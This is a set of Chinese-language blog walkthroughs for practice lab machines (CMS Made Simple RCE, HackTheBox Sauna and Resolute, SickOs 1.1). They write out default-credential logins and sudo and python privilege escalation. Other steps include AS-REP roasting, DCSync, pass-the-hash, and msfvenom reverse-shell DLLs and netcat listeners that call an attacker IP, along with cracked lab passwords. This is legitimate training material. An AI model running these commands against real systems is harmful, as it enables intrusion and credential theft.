<p>让我们来看看 80 端口，先做一个目录扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.103/</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250318110628253.png" alt="image-20250318110628253"></p>
<p>发现 phpinfo 访问，发现泄露 mycmsms 版本：4.19.8 </p>
<p><img src="/picture/image-20250318113200016.png" alt="image-20250318113200016"></p>
<blockquote>
<p> 十分遗憾的是，直接搜索 My CMSMS exploit 跳出来的直接是该靶机的解题过程，这不是我的本意</p>
</blockquote>
<p>可以在主页面左下角找到 CMS Made Simple 版本 2.2.13</p>
<p><img src="/picture/image-20250318120029915.png" alt="image-20250318120029915"></p>
<p>去寻找下 CMS Made Simple 2.2.13 漏洞。遗憾的是，搜索到的漏洞都与要登陆 &#x2F;admin 后才能利用：</p>
<p><img src="/picture/image-20250318120627194.png" alt="image-20250318120627194"></p>
<p>可以在这里发现后台登陆页面：</p>
<p><img src="/picture/image-20250318202509495.png" alt="image-20250318202509495"></p>
<p>尝试 admin&#x2F;admin ，admin&#x2F;passwd 等弱口令登陆，可惜失败了，同时发现，后台对于输出做了限制，防止用户名泄露</p>
<p><img src="/picture/image-20250318202825982.png" alt="image-20250318202825982"></p>
<p>更改 POST 数据，看看有没有 SQL 注入漏洞，也失败了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&quot;%)#--%23&amp;password=admin&#x27;&quot;%)#--%23&amp;loginsubmit=Submit&#x27;&quot;%)#--%23</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250318203122088.png" alt="image-20250318203122088"></p>
<p>来看下 3306 端口吧，尝试默认密码组合登陆：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 172.16.33.103 -uroot -proot --skip-ssl-verify-server-cert </span><br></pre></td></tr></table></figure>

<p>十分幸运，登陆成功了：</p>
<p><img src="/picture/image-20250318210954301.png" alt="image-20250318210954301"></p>
<p>查看数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.053 sec)</span><br></pre></td></tr></table></figure>

<p>使用 cmsms_db 数据库，查看数据表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; use cmsms_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt; show tables;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">| cms_additional_users_seq       |</span><br><span class="line">| cms_admin_bookmarks            |</span><br><span class="line">| cms_admin_bookmarks_seq        |</span><br><span class="line">| cms_adminlog                   |</span><br><span class="line">| cms_content                    |</span><br><span class="line">| cms_content_props              |</span><br><span class="line">| cms_content_props_seq          |</span><br><span class="line">| cms_content_seq                |</span><br><span class="line">| cms_event_handler_seq          |</span><br><span class="line">| cms_event_handlers             |</span><br><span class="line">| cms_events                     |</span><br><span class="line">| cms_events_seq                 |</span><br><span class="line">| cms_group_perms                |</span><br><span class="line">| cms_group_perms_seq            |</span><br><span class="line">| cms_groups                     |</span><br><span class="line">| cms_groups_seq                 |</span><br><span class="line">| cms_layout_design_cssassoc     |</span><br><span class="line">| cms_layout_design_tplassoc     |</span><br><span class="line">| cms_layout_designs             |</span><br><span class="line">| cms_layout_stylesheets         |</span><br><span class="line">| cms_layout_templates           |</span><br><span class="line">| cms_layout_tpl_addusers        |</span><br><span class="line">| cms_layout_tpl_categories      |</span><br><span class="line">| cms_layout_tpl_type            |</span><br><span class="line">| cms_locks                      |</span><br><span class="line">| cms_mod_cmsjobmgr              |</span><br><span class="line">| cms_mod_filepicker_profiles    |</span><br><span class="line">| cms_module_deps                |</span><br><span class="line">| cms_module_news                |</span><br><span class="line">| cms_module_news_categories     |</span><br><span class="line">| cms_module_news_categories_seq |</span><br><span class="line">| cms_module_news_fielddefs      |</span><br><span class="line">| cms_module_news_fieldvals      |</span><br><span class="line">| cms_module_news_seq            |</span><br><span class="line">| cms_module_search_index        |</span><br><span class="line">| cms_module_search_items        |</span><br><span class="line">| cms_module_search_items_seq    |</span><br><span class="line">| cms_module_search_words        |</span><br><span class="line">| cms_module_smarty_plugins      |</span><br><span class="line">| cms_module_templates           |</span><br><span class="line">| cms_modules                    |</span><br><span class="line">| cms_permissions                |</span><br><span class="line">| cms_permissions_seq            |</span><br><span class="line">| cms_routes                     |</span><br><span class="line">| cms_siteprefs                  |</span><br><span class="line">| cms_user_groups                |</span><br><span class="line">| cms_userplugins                |</span><br><span class="line">| cms_userplugins_seq            |</span><br><span class="line">| cms_userprefs                  |</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">53 rows in set (0.035 sec)</span><br></pre></td></tr></table></figure>

<p>查看 cms_users 信息，发现 admin 哈希密码 <code>fb67c6d24e756229aab021cea7605fb3</code> ：</p>
<p><img src="/picture/image-20250318211324263.png" alt="image-20250318211324263"></p>
<p>查看该密文是由什么加密：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hash-identifier fb67c6d24e756229aab021cea7605fb3</span><br></pre></td></tr></table></figure>

<p>看起来最有可能是 MD5</p>
<p><img src="/picture/image-20250318211936574.png" alt="image-20250318211936574"></p>
<p>看看能不能用 hashcat 的字典模式暴力破解出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 fb67c6d24e756229aab021cea7605fb3 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>可惜没跑出来</p>
<p><img src="/picture/image-20250318212045908.png" alt="image-20250318212045908"></p>
<p>由于是 root 权限，看看能不能直接更改密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; update cms_users set password = MD5(&#x27;123456&#x27;) where username = &#x27;admin&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.037 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>使用 admin &#x2F; 123456 登陆看看，还是失败了</p>
<p><img src="/picture/image-20250318213254470.png" alt="image-20250318213254470"></p>
<p>既然已知 CMS 的版本，那岂不是可以去网上搜索 admin 账户的密码的加密方式？说干就干，在网站搜索 CMS Made Simple admin password </p>
<p>幸运的是，在 <a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery</a> 中找到了 admin 密码的加密方式：</p>
<p><img src="/picture/image-20250318215218448.png" alt="image-20250318215218448"></p>
<p>稍作更改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>成功进入后台：</p>
<p><img src="/picture/image-20250318215409826.png" alt="image-20250318215409826"></p>
<p>使用 <a href="https://dev.cmsmadesimple.org/bug/view/12275">https://dev.cmsmadesimple.org/bug/view/12275</a> 中的 exp 尝试 RCE</p>
<p><img src="/picture/image-20250318220216279.png" alt="image-20250318220216279"></p>
<p>利用失败，尝试扩大利用范围，使用版本相近的 2.2.14 exp 代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -m 48779</span><br><span class="line">python 48779.py --url http://172.16.33.103/admin/login.php -u admin -p 123 -lhost 10.8.0.90 -lport 1234</span><br><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>

<p>getshell ：</p>
<p><img src="/picture/image-20250318222649383.png" alt="image-20250318222649383"></p>
<p><img src="/picture/image-20250318222710238.png" alt="image-20250318222710238"></p>
<p>接下来是提权，查看 sudo 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250319182043155.png" alt="image-20250319182043155"></p>
<p>搜索对应版本 sudo 漏洞利用代码：CVE-2021-3156</p>
<p>上传至目标主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90:4444/exp.py</span><br><span class="line"><span class="built_in">chmod</span> +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250319182951767.png" alt="image-20250319182951767"></p>
<p>或者在 &#x2F;var&#x2F;www&#x2F;html&#x2F;admin 目录下发现 .htpasswd 文件，内容为密文 <code>TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</code></p>
<p>使用 cyberchef 的 magic 方法破解出账户和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250319183333186.png" alt="image-20250319183333186"></p>
<p>切换至 armour 用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su armour</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250319183733223.png" alt="image-20250319183733223"></p>
<p>该用户具有 pyhon sudo 权限</p>
<p><img src="/picture/image-20250319184057890.png" alt="image-20250319184057890"></p>
<p>使用 python 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250319184130060.png" alt="image-20250319184130060"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Resolute Record</title>
    <url>/2025/04/28/Sauna/</url>
    <content><![CDATA[<h1 id="Sauna-Walkthrough"><a href="#Sauna-Walkthrough" class="headerlink" title="Sauna Walkthrough"></a>Sauna Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/Sauna">Sauna</a></p>
<p>Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn&amp;amp;#039;t require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the <em>DS-Replication-Get-Changes-All</em> extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket&amp;amp;#039;s psexec.py in order to gain a shell on the box as <code>NT_AUTHORITY\SYSTEM</code>.</p>
<p><img src="/picture/image-20250423132154309.png" alt="image-20250423132154309"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>nmap 对目标主机就行端口发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.129.223.5 --min-rate 5000</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250423120111160.png" alt="image-20250423120111160"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.129.223.5</span><br></pre></td></tr></table></figure>

<p>并没有泄露域名，目标主机开放 LDAP 服务</p>
<p><img src="/picture/image-20250423120739468.png" alt="image-20250423120739468"></p>
<p>使用 enum4linux 对 SMB 服务进行侦察</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.223.5</span><br></pre></td></tr></table></figure>

<p>可以使用空用户名和密码对，同时泄露了不完整的域名</p>
<p><img src="/picture/image-20250422191659169.png" alt="image-20250422191659169"></p>
<p>使用 crackmapexec 对 SMB 服务枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.223.5 --shares -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>泄露完整域名 : <code>egotistical-bank.local</code></p>
<p><img src="/picture/image-20250422191828385.png" alt="image-20250422191828385"></p>
<p>访问 80 页面，在 about.html 发现泄露员工名称</p>
<p><img src="/picture/image-20250422192506024.png" alt="image-20250422192506024"></p>
<p>使用 username-anarchy 生成用户名密码字典</p>
<blockquote>
<p>以 Hugo Bear 为例，first,last,flast,firstl,first.last 分别是 hugo, bear, hbearhugob, hugo.bear</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file ../users.txt --select-format first,last,flast,firstl,first.last &gt; ../usernames.txt</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422201101988.png" alt="image-20250422201101988"></p>
<p>编写脚本，猜测用户名仅作为用户账户，使用 GetNPUsers  循环使用用户名进行 nopass 尝试登陆，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> impacket-GetNPUsers -dc-ip 10.129.223.5 -no-pass -request egotistical-bank.local/<span class="string">&quot;<span class="variable">$file</span>&quot;</span> 2&gt;/dev/null &gt;&gt; hash.txt; <span class="keyword">done</span> &lt; usernames.txt</span><br></pre></td></tr></table></figure>

<p>获得 fsmith 账号和 TGT 哈希，可以尝试 AS-REP Roasting</p>
<p><img src="/picture/image-20250422201019699.png" alt="image-20250422201019699"></p>
<p>使用 hashcat 18200 模式 AS-REP 破解密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash -a 0 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250423124737439.png" alt="image-20250423124737439"></p>
<p>爆破出密码 Thestrokes23</p>
<p><img src="/picture/image-20250422201447475.png" alt="image-20250422201447475"></p>
<p>由于目标主机开放 WinRM 服务，借此进行横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u fsmith -p Thestrokes23 -i 10.129.223.5</span><br></pre></td></tr></table></figure>

<p>获得 fsmith 的 shell</p>
<p><img src="/picture/image-20250422202914257.png" alt="image-20250422202914257"></p>
<p>在 fsmith 的 Desktop 目录获得 user.txt</p>
<p><img src="/picture/image-20250422203013643.png" alt="image-20250422203013643"></p>
<p>上传并执行 winPEAS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.13/winPEASany.exe -O winPEASany.exe</span><br><span class="line">.\winPEAS</span><br></pre></td></tr></table></figure>

<p>泄露 AutoLogon 账户密码：svc_loanmanager&#x2F;Moneymakestheworldgoround!</p>
<p><img src="/picture/image-20250422204004089.png" alt="image-20250422204004089"></p>
<p>在 Users 中查询到登录名为 svc_loanmgr</p>
<p><img src="/picture/image-20250422210101619.png" alt="image-20250422210101619"></p>
<p>再次借助 WinRM 横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u svc_loanmgr -p &#x27;Moneymakestheworldgoround!&#x27; -i 10.129.223.5</span><br></pre></td></tr></table></figure>

<p>获得 svc_loanmgr 的 shell</p>
<p><img src="/picture/image-20250422210423741.png" alt="image-20250422210423741"></p>
<p>上传 SharpHound</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.13/SharpHound.ps1 -O SharpHound.ps1</span><br></pre></td></tr></table></figure>

<p>导入 power shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\SharpHound.ps1</span><br></pre></td></tr></table></figure>

<p>收集信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-BloodHound -CollectionMethod All</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422211352645.png" alt="image-20250422211352645"></p>
<p>kali 本机开启 SMB 共享</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -username kali -password kali -smb2support home .</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422211802625.png" alt="image-20250422211802625"></p>
<p>目标主机加入 SMB 共享，将生成的 zip 文件拷贝至 kali 本机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.14.13\home /user:kali kali</span><br><span class="line">dir \\10.10.14.13\home</span><br><span class="line">cp 20250422131305_BloodHound.zip \\10.10.14.13\home\20250422131305_BloodHound.zip</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422211825460.png" alt="image-20250422211825460"></p>
<p><img src="/picture/image-20250422211704385.png" alt="image-20250422211704385"></p>
<p>使用 bloodhound 分析，发现可以通过 DCsync 获得域 EGOTISTICAL-BANK.LOCAL 控制权间接获得域 DOMAIN ADMINS 控制权</p>
<p><img src="/picture/image-20250423113124750.png" alt="image-20250423113124750"></p>
<p>使用 secretsdump 进行 DCsync 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -just-dc-user administrator &#x27;egotistical-bank.local&#x27;/&#x27;svc_loanmgr&#x27;:&#x27;Moneymakestheworldgoround!&#x27;@10.129.223.5</span><br></pre></td></tr></table></figure>

<p>获得 administrator 密码哈希</p>
<p><img src="/picture/image-20250423113532943.png" alt="image-20250423113532943"></p>
<p>进行 PtH 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.129.223.5</span><br></pre></td></tr></table></figure>

<p>拿下域控职权</p>
<p><img src="/picture/image-20250423113548061.png" alt="image-20250423113548061"></p>
<p>在 administrator 的桌面获得 root.txt</p>
<p><img src="/picture/image-20250423113724954.png" alt="image-20250423113724954"></p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250423114103163.png" alt="image-20250423114103163"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>HTB</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>Resolute Record</title>
    <url>/2025/04/24/Resolute/</url>
    <content><![CDATA[<h1 id="Resolute-Record"><a href="#Resolute-Record" class="headerlink" title="Resolute Record"></a>Resolute Record</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/220">Resolute</a></p>
<p>Resolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group. This group has the ability to specify that the DNS Server service loads a plugin DLL. After restarting the DNS service, we achieve command execution on the domain controller in the context of <code>NT_AUTHORITY\SYSTEM</code>.</p>
<p><img src="/picture/image-20250424210723202.png" alt="image-20250424210723202"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>使用 nmap 扫描目标主机端口即应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sC -sV 10.129.96.155 --min-rate 2500</span><br></pre></td></tr></table></figure>

<p>发现泄露域名 megabank.local 以及全限定域名 Resolute.megabank.local</p>
<p><img src="/picture/image-20250424144251568.png" alt="image-20250424144251568"></p>
<p>将目标 IP 和全限定域名绑定说不定有用</p>
<p><img src="/picture/image-20250424144323933.png" alt="image-20250424144323933"></p>
<p>使用 smbclient 枚举共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N -L //10.129.96.155</span><br></pre></td></tr></table></figure>

<p>看来没有给匿名用户设置文件共享</p>
<p><img src="/picture/image-20250424144605971.png" alt="image-20250424144605971"></p>
<p>使用 enum4linux 对目标主机 SMB 服务枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 10.129.96.155</span><br></pre></td></tr></table></figure>

<p>在 Users 栏目发现泄露账户密码 marko &#x2F; Welcome123!</p>
<p><img src="/picture/image-20250424144655034.png" alt="image-20250424144655034"></p>
<p>使用 crackmapexec 查看 marko 的密码是否真的是 Welcome123!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 -u &#x27;marko&#x27; -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看来不是</p>
<p><img src="/picture/image-20250424145915017.png" alt="image-20250424145915017"></p>
<p>查看目标主机密码策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 --pass-pol -u &#x27;&#x27; -p &#x27;&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现目标主机的没有账户锁定，可以进行密码爆破</p>
<p><img src="/picture/image-20250424152125501.png" alt="image-20250424152125501"></p>
<p>由于 Welcome123! 是默认密码，将 Users 制作成密码字典，使用密码喷洒看看有没有其他用户也是默认密码</p>
<p><img src="/picture/image-20250424145513060.png" alt="image-20250424145513060"></p>
<p>使用 crackmapexec 进行 SMB 服务密码喷洒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.129.96.155 -u username.txt -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>没 <strong>Pwn3d!</strong> 标志，说明需寻找其他途径提升权限</p>
<p><img src="/picture/image-20250424145802912.png" alt="image-20250424145802912"></p>
<p>尝试下最常用的 winrm 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.129.96.155 -u username.txt -p &#x27;Welcome123!&#x27; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>有 <strong>Pwn3d!</strong> 标志，可直接控制目标，进入渗透下一阶段</p>
<p><img src="/picture/image-20250424184201192.png" alt="image-20250424184201192"></p>
<p>使用 evil-winrm 借助 winrm 进行横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u &#x27;megabank.local\melanie&#x27; -p &#x27;Welcome123!&#x27; -i 10.129.96.155</span><br></pre></td></tr></table></figure>

<p>获得 melanie 域用户的 powershell ，并在其桌面获得 user.txt</p>
<p><img src="/picture/image-20250424150501555.png" alt="image-20250424150501555"></p>
<p>在根目录发现疑似 powershell 命令历史文件夹，且是隐藏的</p>
<p><img src="/picture/image-20250424191030900.png" alt="image-20250424191030900"></p>
<p>发现 powershell 命令历史文件</p>
<p><img src="/picture/image-20250424192016269.png" alt="image-20250424192016269"></p>
<p>泄露了 ryan 用户的密码：Serv3r4Admin4cc123!</p>
<p><img src="/picture/image-20250424192242503.png" alt="image-20250424192242503"></p>
<p>看看 ryan 有什么权限</p>
<p><img src="/picture/image-20250424192457237.png" alt="image-20250424192457237"></p>
<p>使用 crackmapexec 看看 ryan 能否访问 ADMIN$ 等目录，看起来不行，就不能使用 impacket-psexec 执行命令</p>
<p><img src="/picture/image-20250424193159640.png" alt="image-20250424193159640"></p>
<p>那就使用 evil-winrm 横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u &#x27;megabank.local\ryan&#x27; -p &#x27;Serv3r4Admin4cc123!&#x27; -i 10.129.96.155</span><br></pre></td></tr></table></figure>

<p>获得 ryan 的 powershell</p>
<p><img src="/picture/image-20250424195430809.png" alt="image-20250424195430809"></p>
<p>发现 ryan 属于 DnsAdmin 用户组</p>
<p><img src="/picture/image-20250424195328187.png" alt="image-20250424195328187"></p>
<p>我们可以通过 ryan 帐户使用外部 DLL 插件文件执行 dnscmd.exe 命令来进行权限提升</p>
<p>什么方式都失败了，感觉是因为靶机没 60s 重置一次太搞了，就记录下攻击方法吧 …</p>
<blockquote>
<p>【1】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;net user administrator P@s5w0rd123! /domain&#x27; -f dll &gt; add.dll</span><br><span class="line">impacket-smbserver share ./</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.18\share\add.dll</span><br><span class="line">   sc.exe stop dns</span><br><span class="line">   sc.exe start dns</span><br></pre></td></tr></table></figure>
   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;impacket-psexec &#x27;megabank.local/administrator&#x27;:&#x27;P@s5w0rd123!&#x27;@10.129.96.155</span><br></pre></td></tr></table></figure>

<p>   【2】</p>
   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 --platform=windows -f dll &gt; shell.dll</span><br><span class="line">impacket-smbserver share ./</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.18\share\shell.dll</span><br><span class="line">sc.exe stop dns</span><br><span class="line">&gt;sc.exe start dns</span><br></pre></td></tr></table></figure>

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>HTB</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>SickOs 1.1 Walkthrough</title>
    <url>/2025/04/15/SickOs%201/</url>
    <content><![CDATA[<h1 id="SickOs-1-1-Walkthrough"><a href="#SickOs-1-1-Walkthrough" class="headerlink" title="SickOs 1.1 Walkthrough"></a>SickOs 1.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
<p><img src="/picture/image-20250415184842698.png" alt="image-20250415184842698"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250415155934060.png" alt="image-20250415155934060"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.153</span><br></pre></td></tr></table></figure>

<p>发现开放 22，3128 端口</p>
<p><img src="/picture/image-20250415160011982.png" alt="image-20250415160011982"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,3128 -A 192.168.186.153 </span><br></pre></td></tr></table></figure>

<p>22 和 3128 端口都没有什么可以直接利用的漏洞，</p>
<p><img src="/picture/image-20250415160104311.png" alt="image-20250415160104311"></p>
<p>3128 端口是作为代理使用的，所以想访问 80 端口必须走 3128 端口代理，使用代理对 80 端口进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/ --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>

<p>发现 &#x2F;connect 和 &#x2F;robots.txt 目录</p>
<p><img src="/picture/image-20250415160618029.png" alt="image-20250415160618029"></p>
<p>开启 Firefox 全局代理，所有请求都要通过 3128 代理转发</p>
<p><img src="/picture/image-20250415160839856.png" alt="image-20250415160839856"></p>
<p>访问 80 端口主页面，没有泄露任何信息</p>
<p><img src="/picture/image-20250415161045216.png" alt="image-20250415161045216"></p>
<p>访问 connect 发现是谜语</p>
<p><img src="/picture/image-20250415165355072.png" alt="image-20250415165355072"></p>
<p>访问 robots.txt ，会发现除了 80 端口根目录外，还有 &#x2F;wolfcms 也是 Disallow 的</p>
<p><img src="/picture/image-20250415161159986.png" alt="image-20250415161159986"></p>
<p>访问，是 Wolf 的主目录</p>
<p><img src="/picture/image-20250415165521729.png" alt="image-20250415165521729"></p>
<p>对 WolfCMS 进行进一步扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/wolfcms --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>

<p>其中 20B 大小的内容是空的</p>
<p><img src="/picture/image-20250415165848811.png" alt="image-20250415165848811"></p>
<p>在 &#x2F;wolfcms&#x2F;docs&#x2F;updating.txt 文件中可以发现 Wolf CMS 版本更新至 0.8.2 </p>
<p><img src="/picture/image-20250415170001718.png" alt="image-20250415170001718"></p>
